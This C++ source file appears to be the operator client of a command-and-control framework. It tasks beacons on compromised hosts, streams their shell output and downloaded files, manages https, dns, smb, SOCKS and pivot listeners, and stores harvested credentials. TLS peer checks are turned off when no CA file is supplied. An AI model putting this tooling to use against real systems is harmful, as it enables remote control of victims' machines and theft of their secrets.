#include "ServerClient.hpp"

#include <co2h/kv.hpp>
#include <co2h/version.hpp>

#include <QMetaType>

#include <charconv>
#include <functional>

namespace co2h::client {

using namespace ::co2h::kv;

ServerClient::ServerClient(QObject* parent) : QObject(parent) {
    qRegisterMetaType<QVector<BeaconRow>>("QVector<co2h::client::BeaconRow>");
    qRegisterMetaType<QVector<ListenerRow>>("QVector<co2h::client::ListenerRow>");
    qRegisterMetaType<QVector<CredentialRowSrv>>("QVector<co2h::client::CredentialRowSrv>");
    qRegisterMetaType<QVector<OperatorRowSrv>>("QVector<co2h::client::OperatorRowSrv>");
}

ServerClient::~ServerClient() {
    disconnectFromServer();
}

void ServerClient::connectToServer(const QString& host, quint16 port,
                                   const QString& user, const QString& pass,
                                   const QString& ca_file,
                                   const QString& client_cert,
                                   const QString& client_key) {
    disconnectFromServer();
    host_ = host; port_ = port; user_ = user; pass_ = pass;
    ca_file_ = ca_file;
    client_cert_ = client_cert;
    client_key_  = client_key;
    running_ = true;
    thread_ = std::thread([this]{ ioThread(); });
}

void ServerClient::disconnectFromServer() {
    if (!running_.exchange(false)) return;
    if (io_) io_->stop();
    if (thread_.joinable()) thread_.join();
    stream_.reset();
    tls_.reset();
    io_.reset();
}

void ServerClient::ioThread() {
    io_  = std::make_unique<asio::io_context>();
    tls_ = std::make_unique<asio::ssl::context>(asio::ssl::context::tls_client);
    tls_->set_options(asio::ssl::context::default_workarounds
                    | asio::ssl::context::no_sslv2
                    | asio::ssl::context::no_sslv3
                    | asio::ssl::context::no_tlsv1
                    | asio::ssl::context::no_tlsv1_1);
    try {
        if (!ca_file_.isEmpty()) {
            tls_->load_verify_file(ca_file_.toStdString());
            tls_->set_verify_mode(asio::ssl::verify_peer);
        } else {
            tls_->set_verify_mode(asio::ssl::verify_none);
        }
        if (!client_cert_.isEmpty() && !client_key_.isEmpty()) {
            tls_->use_certificate_chain_file(client_cert_.toStdString());
            tls_->use_private_key_file(client_key_.toStdString(),
                                       asio::ssl::context::pem);
        }
    } catch (const std::exception& e) {
        emit disconnected(QStringLiteral("TLS init failed: %1")
                          .arg(QString::fromLocal8Bit(e.what())));
        return;
    }

    stream_ = std::make_unique<SslStream>(*io_, *tls_);

    asio::ip::tcp::resolver resolver{*io_};
    std::error_code ec;
    auto endpoints = resolver.resolve(host_.toStdString(),
                                      std::to_string(port_), ec);
    if (ec) {
        emit disconnected(QStringLiteral("resolve failed: %1")
                          .arg(QString::fromLocal8Bit(ec.message().c_str())));
        return;
    }
    asio::connect(stream_->lowest_layer(), endpoints, ec);
    if (ec) {
        emit disconnected(QStringLiteral("connect failed: %1")
                          .arg(QString::fromLocal8Bit(ec.message().c_str())));
        return;
    }

    startHandshake(host_.toStdString());
    io_->run();
}

void ServerClient::startHandshake(const std::string& host) {
    (void)host;
    stream_->async_handshake(asio::ssl::stream_base::client,
        [this](const std::error_code& ec) {
            if (ec) {
                emit disconnected(QStringLiteral("tls handshake failed: %1")
                                  .arg(QString::fromLocal8Bit(ec.message().c_str())));
                return;
            }
            emit connected();
            Writer w;
            w.put_u32("v_major", ::co2h::kProtoVersionMajor);
            w.put_u32("v_minor", ::co2h::kProtoVersionMinor);
            w.put_str("client", ::co2h::kProductName);
            auto body = w.finish();
            send(proto::MsgType::Hello, {body.data(), body.size()});
            doRead();
        });
}

void ServerClient::doRead() {
    stream_->async_read_some(asio::buffer(rbuf_),
        [this](const std::error_code& ec, std::size_t n) {
            if (ec) {
                emit disconnected(QStringLiteral("connection lost: %1")
                                  .arg(QString::fromLocal8Bit(ec.message().c_str())));
                return;
            }
            onRead(n);
        });
}

void ServerClient::onRead(std::size_t n) {
    decoder_.feed({rbuf_.data(), n});
    while (auto f = decoder_.next()) processFrame(*f);
    if (decoder_.too_large()) {
        emit disconnected("frame too large");
        return;
    }
    doRead();
}

void ServerClient::processFrame(const proto::Frame& f) {
    switch (f.type) {
        case proto::MsgType::HelloAck: {
            Reader r{{f.payload.data(), f.payload.size()}};
            auto product = QString::fromStdString(std::string{
                r.get_str("product").value_or("")});
            auto version = QString::fromStdString(std::string{
                r.get_str("version").value_or("")});
            emit serverHello(product, version);
            Writer w;
            w.put_str("username", user_.toStdString());
            w.put_str("password", pass_.toStdString());
            auto body = w.finish();
            send(proto::MsgType::Auth, {body.data(), body.size()});
            break;
        }
        case proto::MsgType::AuthAck: {
            Reader r{{f.payload.data(), f.payload.size()}};
            auto status = r.get_str("status").value_or("");
            if (status == "ok") {
                emit authOk(r.get_u64("operator_id").value_or(0),
                            QString::fromStdString(std::string{
                                r.get_str("role").value_or("")}));
                Writer w;
                w.put_u32("mask", 0xFFFFFFFFu);
                auto body = w.finish();
                send(proto::MsgType::Subscribe, {body.data(), body.size()});
            } else {
                auto reason = r.get_str("reason").value_or("authentication failed");
                emit authFailed(QString::fromStdString(std::string{reason}));
            }
            break;
        }
        case proto::MsgType::Response: {
            Reader r{{f.payload.data(), f.payload.size()}};
            auto id   = r.get_u64("id").value_or(0);
            auto bpay = r.get_bytes("payload").value_or(BytesView{});
            // Inspect payload schema to decide type of response.
            Reader pr{bpay};
            // Если это ответ на kTaskBeacon — там лежит task_id.
            bool is_task_rpc = false;
            {
                std::lock_guard lk{task_rpc_mu_};
                auto it = task_rpc_ids_.find(id);
                if (it != task_rpc_ids_.end()) {
                    task_rpc_ids_.erase(it);
                    is_task_rpc = true;
                }
            }
            if (is_task_rpc) {
                auto tid = pr.get_u64("task_id").value_or(0);
                emit taskCreated(id, tid);
                break;
            }

            // Явно маркированные RPC (creds_list пересекается по полям с sessions).
            std::string kind;
            {
                std::lock_guard lk{rpc_kind_mu_};
                auto it = rpc_kind_.find(id);
                if (it != rpc_kind_.end()) {
                    kind = it->second;
                    rpc_kind_.erase(it);
                }
            }
            if (kind == "operators_list") {
                QVector<OperatorRowSrv> rows;
                if (auto cnt = pr.get_u32("count")) {
                    for (std::uint32_t i = 0; i < *cnt; ++i) {
                        auto idx = std::to_string(i);
                        OperatorRowSrv o;
                        o.id         = pr.get_u64("id_"       + idx).value_or(0);
                        o.username   = QString::fromStdString(std::string{
                            pr.get_str("username_" + idx).value_or("")});
                        o.role       = QString::fromStdString(std::string{
                            pr.get_str("role_"     + idx).value_or("")});
                        o.created_at = pr.get_u64("created_"  + idx).value_or(0);
                        rows.push_back(o);
                    }
                }
                emit operatorsReceived(rows);
                break;
            }

            if (kind == "operator_action") {
                auto err = pr.get_str("error").value_or("");
                auto status_str = pr.get_str("status").value_or("");
                bool ok = err.empty() && status_str != "not_found";
                QString msg = ok
                    ? QString::fromStdString(std::string{status_str.empty() ? "ok" : status_str})
                    : QString::fromStdString(std::string{err.empty() ? status_str : err});
                emit operatorActionResult(id, ok, msg);
                break;
            }

            if (kind == "listener_del") {
                auto err    = pr.get_str("error").value_or("");
                auto lname  = QString::fromStdString(std::string{
                    pr.get_str("listener_name").value_or("")});
                if (err.empty()) {
                    emit logLine(QString("[listener] removed: %1").arg(lname));
                    listListeners(); // немедленно обновить список
                } else {
                    emit logLine(QString("[listener] remove failed: %1").arg(
                        QString::fromStdString(std::string{err})));
                }
                break;
            }

            if (kind == "creds_list") {
                QVector<CredentialRowSrv> rows;
                if (auto cnt = pr.get_u32("count")) {
                    for (std::uint32_t i = 0; i < *cnt; ++i) {
                        auto idx = std::to_string(i);
                        CredentialRowSrv c;
                        c.id       = pr.get_u64("id_"     + idx).value_or(0);
                        c.user     = QString::fromStdString(std::string{
                            pr.get_str("user_"   + idx).value_or("")});
                        c.domain   = QString::fromStdString(std::string{
                            pr.get_str("domain_" + idx).value_or("")});
                        c.kind     = QString::fromStdString(std::string{
                            pr.get_str("kind_"   + idx).value_or("")});
                        c.secret   = QString::fromStdString(std::string{
                            pr.get_str("secret_" + idx).value_or("")});
                        c.host     = QString::fromStdString(std::string{
                            pr.get_str("host_"   + idx).value_or("")});
                        c.source   = QString::fromStdString(std::string{
                            pr.get_str("source_" + idx).value_or("")});
                        c.note     = QString::fromStdString(std::string{
                            pr.get_str("note_"   + idx).value_or("")});
                        c.added_by = QString::fromStdString(std::string{
                            pr.get_str("by_"     + idx).value_or("")});
                        c.added_at = pr.get_u64("ts_"     + idx).value_or(0);
                        rows.push_back(c);
                    }
                }
                emit credsListReceived(rows);
                break;
            }

            if (kind == "sessions_list") {
                QVector<BeaconRow> rows;
                auto cnt = pr.get_u32("count").value_or(0);
                for (std::uint32_t i = 0; i < cnt; ++i) {
                    auto idx = std::to_string(i);
                    BeaconRow b;
                    b.id          = QString::fromStdString(std::string{
                        pr.get_str("id_"          + idx).value_or("")});
                    b.parent_id   = QString::fromStdString(std::string{
                        pr.get_str("parent_id_"   + idx).value_or("")});
                    b.host        = QString::fromStdString(std::string{
                        pr.get_str("host_"        + idx).value_or("")});
                    b.user        = QString::fromStdString(std::string{
                        pr.get_str("user_"        + idx).value_or("")});
                    b.listener    = QString::fromStdString(std::string{
                        pr.get_str("listener_"    + idx).value_or("")});
                    b.internal_ip = QString::fromStdString(std::string{
                        pr.get_str("internal_ip_" + idx).value_or("")});
                    b.external_ip = QString::fromStdString(std::string{
                        pr.get_str("external_ip_" + idx).value_or("")});
                    b.arch       = QString::fromStdString(std::string{
                        pr.get_str("arch_"       + idx).value_or("x64")});
                    b.os         = QString::fromStdString(std::string{
                        pr.get_str("os_"         + idx).value_or("windows")});
                    b.pid        = pr.get_u32("pid_"       + idx).value_or(0);
                    b.first_seen = static_cast<qint64>(
                        pr.get_u64("first_seen_" + idx).value_or(0));
                    b.last_seen  = static_cast<qint64>(
                        pr.get_u64("last_seen_"  + idx).value_or(0));
                    if (!b.id.isEmpty()) rows.push_back(b);
                }
                emit sessionsReceived(rows);
                break;
            }

            if (kind == "listeners_list") {
                QVector<ListenerRow> rows;
                auto cnt = pr.get_u32("count").value_or(0);
                for (std::uint32_t i = 0; i < cnt; ++i) {
                    auto idx = std::to_string(i);
                    ListenerRow l;
                    l.name       = QString::fromStdString(std::string{
                        pr.get_str("name_"    + idx).value_or("")});
                    l.kind       = QString::fromStdString(std::string{
                        pr.get_str("kind_"    + idx).value_or("")});
                    l.bind       = QString::fromStdString(std::string{
                        pr.get_str("bind_"    + idx).value_or("")});
                    l.key_hex    = QString::fromStdString(std::string{
                        pr.get_str("key_hex_"    + idx).value_or("")});
                    l.pubkey_hex = QString::fromStdString(std::string{
                        pr.get_str("pubkey_hex_" + idx).value_or("")});
                    l.domain     = QString::fromStdString(std::string{
                        pr.get_str("domain_"     + idx).value_or("")});
                    l.uri_checkin = QString::fromStdString(std::string{
                        pr.get_str("uri_checkin_" + idx).value_or("")});
                    l.uri_task   = QString::fromStdString(std::string{
                        pr.get_str("uri_task_"   + idx).value_or("")});
                    l.uri_post   = QString::fromStdString(std::string{
                        pr.get_str("uri_post_"   + idx).value_or("")});
                    l.cookie     = QString::fromStdString(std::string{
                        pr.get_str("cookie_"     + idx).value_or("")});
                    l.user_agent = QString::fromStdString(std::string{
                        pr.get_str("ua_"         + idx).value_or("")});
                    rows.push_back(l);
                }
                emit listenersReceived(rows);
                break;
            }
            break;
        }
        case proto::MsgType::Event: {
            Reader r{{f.payload.data(), f.payload.size()}};
            auto cat  = r.get_u32("cat").value_or(0);
            auto data = r.get_bytes("data").value_or(BytesView{});
            if (cat == static_cast<std::uint32_t>(proto::EventCategory::Tasks)) {
                Reader pr{data};
                auto bid = QString::fromStdString(std::string{
                    pr.get_str("beacon_id").value_or("")});
                auto tid     = pr.get_u64("task_id").value_or(0);
                auto err     = QString::fromStdString(std::string{
                    pr.get_str("error").value_or("")});
                auto out     = pr.get_bytes("output").value_or(BytesView{});
                auto is_last = pr.get_u32("is_last").value_or(1);
                auto resp    = pr.get_u32("resp").value_or(2); // 2=RESP_OUTPUT, 3=RESP_FILE

                static constexpr std::uint32_t kRespFile = 3;

                if (resp == kRespFile) {
                    // RESP_FILE: накапливаем все чанки до is_last=1, тогда
                    // испускаем одним сигналом. Иначе бинарные данные падали
                    // бы в appendOutput() консоли по кусочкам.
                    if (out.size())
                        dl_chunks_[tid].append(
                            reinterpret_cast<const char*>(out.data()),
                            static_cast<int>(out.size()));
                    if (is_last) {
                        emit taskOutput(bid, tid, dl_chunks_.take(tid), err);
                    }
                } else {
                    // RESP_OUTPUT / RESP_ERROR / RESP_PS — стримим сразу,
                    // чтобы ishell и долгие shell-команды выводили построчно.
                    if (out.size()) {
                        QByteArray chunk(reinterpret_cast<const char*>(out.data()),
                                         static_cast<int>(out.size()));
                        emit taskOutput(bid, tid, chunk, err);
                    } else if (is_last) {
                        emit taskOutput(bid, tid, QByteArray{}, err);
                    }
                }
            } else if (cat == static_cast<std::uint32_t>(proto::EventCategory::Credentials)) {
                emit credsChanged();
            } else if (cat == static_cast<std::uint32_t>(proto::EventCategory::Audit)) {
                Reader pr{data};
                auto op_name   = QString::fromStdString(std::string{
                    pr.get_str("operator").value_or("")});
                auto bid       = QString::fromStdString(std::string{
                    pr.get_str("beacon_id").value_or("")});
                auto cmd_text  = QString::fromStdString(std::string{
                    pr.get_str("cmd_text").value_or("")});
                auto ts        = pr.get_u64("ts").value_or(0);
                emit auditReceived(op_name, bid, cmd_text, ts);
            } else if (cat == static_cast<std::uint32_t>(proto::EventCategory::Chat)) {
                Reader pr{data};
                auto from = QString::fromStdString(std::string{
                    pr.get_str("from").value_or("")});
                auto text = QString::fromStdString(std::string{
                    pr.get_str("text").value_or("")});
                auto ts   = pr.get_u64("ts").value_or(0);
                emit chatReceived(from, text, ts);
            }
            break;
        }
        default: break;
    }
}

void ServerClient::listSessions() {
    auto id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[id] = "sessions_list";
    }
    Writer w;
    w.put_u64("id",   id);
    w.put_str("name", proto::cmd::kListSessions);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::listListeners() {
    auto id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[id] = "listeners_list";
    }
    Writer w;
    w.put_u64("id",   id);
    w.put_str("name", proto::cmd::kListListeners);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

quint64 ServerClient::taskBeacon(const QString& beacon_id, proto::TaskOp op,
                                 const QByteArray& payload) {
    const auto rpc_id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{task_rpc_mu_};
        task_rpc_ids_.insert(rpc_id);
    }
    Writer w;
    w.put_u64("id",        rpc_id);
    w.put_str("name",      proto::cmd::kTaskBeacon);
    w.put_str("beacon_id", beacon_id.toStdString());
    w.put_u32("op",        static_cast<std::uint32_t>(op));
    w.put_bytes("payload",
        {reinterpret_cast<const std::uint8_t*>(payload.constData()),
         static_cast<std::size_t>(payload.size())});
    // Передаём текст команды оператора для серверного audit broadcast.
    if (!next_cmd_text_.isEmpty()) {
        w.put_str("cmd_text", next_cmd_text_.toStdString());
        next_cmd_text_.clear();
    }
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
    return rpc_id;
}

void ServerClient::addSocks5Listener(const QString& name, const QString& beacon_id,
                                     const QString& bind_host, quint16 bind_port) {
    Writer w;
    w.put_u64("id",            rpc_next_.fetch_add(1));
    w.put_str("name",          proto::cmd::kAddListener);
    w.put_str("kind",          "socks5");
    w.put_str("listener_name", name.toStdString());
    w.put_str("beacon_id",     beacon_id.toStdString());
    w.put_str("bind_host",     bind_host.toStdString());
    w.put_u32("bind_port",     bind_port);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::addRportfwdListener(const QString& name, const QString& beacon_id,
                                       const QString& bind_host, quint16 bind_port,
                                       const QString& rhost, quint16 rport) {
    Writer w;
    w.put_u64("id",            rpc_next_.fetch_add(1));
    w.put_str("name",          proto::cmd::kAddListener);
    w.put_str("kind",          "rportfwd");
    w.put_str("listener_name", name.toStdString());
    w.put_str("beacon_id",     beacon_id.toStdString());
    w.put_str("bind_host",     bind_host.toStdString());
    w.put_u32("bind_port",     bind_port);
    w.put_str("rhost",         rhost.toStdString());
    w.put_u32("rport",         rport);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::credsList() {
    const auto rpc_id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[rpc_id] = "creds_list";
    }
    Writer w;
    w.put_u64("id",   rpc_id);
    w.put_str("name", proto::cmd::kCredsList);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::credsAdd(const CredentialRowSrv& r) {
    Writer w;
    w.put_u64("id",     rpc_next_.fetch_add(1));
    w.put_str("name",   proto::cmd::kCredsAdd);
    w.put_str("user",   r.user.toStdString());
    w.put_str("domain", r.domain.toStdString());
    w.put_str("kind",   r.kind.toStdString());
    w.put_str("secret", r.secret.toStdString());
    w.put_str("host",   r.host.toStdString());
    w.put_str("source", r.source.toStdString());
    w.put_str("note",   r.note.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::listOperators() {
    const auto rpc_id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[rpc_id] = "operators_list";
    }
    Writer w;
    w.put_u64("id",   rpc_id);
    w.put_str("name", proto::cmd::kListOperators);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::addOperator(const QString& username, const QString& password,
                               const QString& role) {
    const auto rpc_id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[rpc_id] = "operator_action";
    }
    Writer w;
    w.put_u64("id",       rpc_id);
    w.put_str("name",     proto::cmd::kAddOperator);
    w.put_str("username", username.toStdString());
    w.put_str("password", password.toStdString());
    w.put_str("role",     role.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::setOperatorPassword(quint64 id, const QString& password) {
    const auto rpc_id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[rpc_id] = "operator_action";
    }
    Writer w;
    w.put_u64("id",       rpc_id);
    w.put_str("name",     proto::cmd::kSetOperatorPwd);
    w.put_u64("op_id",    id);
    w.put_str("password", password.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::delOperator(quint64 id) {
    const auto rpc_id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[rpc_id] = "operator_action";
    }
    Writer w;
    w.put_u64("id",    rpc_id);
    w.put_str("name",  proto::cmd::kDelOperator);
    w.put_u64("op_id", id);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::credsDel(quint64 id) {
    Writer w;
    w.put_u64("id",      rpc_next_.fetch_add(1));
    w.put_str("name",    proto::cmd::kCredsDel);
    w.put_u64("cred_id", id);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::sendChat(const QString& text) {
    Writer w;
    w.put_u64("id",   rpc_next_.fetch_add(1));
    w.put_str("name", proto::cmd::kChatSend);
    w.put_str("text", text.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::addHttpsListener(const QString& name, const QString& bind_host,
                                    quint16 bind_port, const QString& profile_path) {
    Writer w;
    w.put_u64("id",            rpc_next_.fetch_add(1));
    w.put_str("name",          proto::cmd::kAddListener);
    w.put_str("kind",          "https");
    w.put_str("listener_name", name.toStdString());
    w.put_str("bind_host",     bind_host.toStdString());
    w.put_u32("bind_port",     bind_port);
    if (!profile_path.isEmpty())
        w.put_str("profile_path", profile_path.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::addTcpListener(const QString& name,
                                  const QString& bind_host, quint16 bind_port) {
    Writer w;
    w.put_u64("id",            rpc_next_.fetch_add(1));
    w.put_str("name",          proto::cmd::kAddListener);
    w.put_str("kind",          "tcp");
    w.put_str("listener_name", name.toStdString());
    w.put_str("bind_host",     bind_host.toStdString());
    w.put_u32("bind_port",     bind_port);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::removeListener(const QString& name) {
    auto id = rpc_next_.fetch_add(1);
    {
        std::lock_guard lk{rpc_kind_mu_};
        rpc_kind_[id] = "listener_del";
    }
    Writer w;
    w.put_u64("id",            id);
    w.put_str("name",          proto::cmd::kDelListener);
    w.put_str("listener_name", name.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::addDnsListener(const QString& name, const QString& bind_host,
                                  quint16 bind_port, const QString& c2_domain) {
    Writer w;
    w.put_u64("id",            rpc_next_.fetch_add(1));
    w.put_str("name",          proto::cmd::kAddListener);
    w.put_str("kind",          "dns");
    w.put_str("listener_name", name.toStdString());
    w.put_str("bind_host",     bind_host.toStdString());
    w.put_u32("bind_port",     bind_port);
    w.put_str("c2_domain",     c2_domain.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::addSmbListener(const QString& name, const QString& pipe_name) {
    Writer w;
    w.put_u64("id",            rpc_next_.fetch_add(1));
    w.put_str("name",          proto::cmd::kAddListener);
    w.put_str("kind",          "smb");
    w.put_str("listener_name", name.toStdString());
    w.put_str("pipe_name",     pipe_name.toStdString());
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::addPivotListener(const QString& name,
                                    const QString& bind_host,
                                    quint16 socks_port, quint16 pivot_port) {
    Writer w;
    w.put_u64("id",            rpc_next_.fetch_add(1));
    w.put_str("name",          proto::cmd::kAddListener);
    w.put_str("kind",          "pivot");
    w.put_str("listener_name", name.toStdString());
    w.put_str("bind_host",     bind_host.toStdString());
    w.put_u32("bind_port",     socks_port);
    w.put_u32("pivot_port",    pivot_port);
    auto body = w.finish();
    send(proto::MsgType::Command, {body.data(), body.size()});
}

void ServerClient::send(proto::MsgType type, BytesView payload) {
    if (!io_ || !stream_) return;
    Bytes frame;
    encode_frame(frame, type, payload);
    bool need_write;
    {
        std::lock_guard lk{wmu_};
        wq_.push_back(std::move(frame));
        need_write = !writing_;
        writing_ = true;
    }
    if (!need_write) return;
    asio::post(*io_, [this] {
        auto self = this;
        auto write_one = std::make_shared<std::function<void()>>();
        *write_one = [self, write_one]() {
            std::lock_guard lk{self->wmu_};
            if (self->wq_.empty()) { self->writing_ = false; return; }
            auto& front = self->wq_.front();
            asio::async_write(*self->stream_, asio::buffer(front),
                [self, write_one](const std::error_code& ec, std::size_t) {
                    if (ec) return;
                    {
                        std::lock_guard lk{self->wmu_};
                        self->wq_.pop_front();
                    }
                    (*write_one)();
                });
        };
        (*write_one)();
    });
}

}
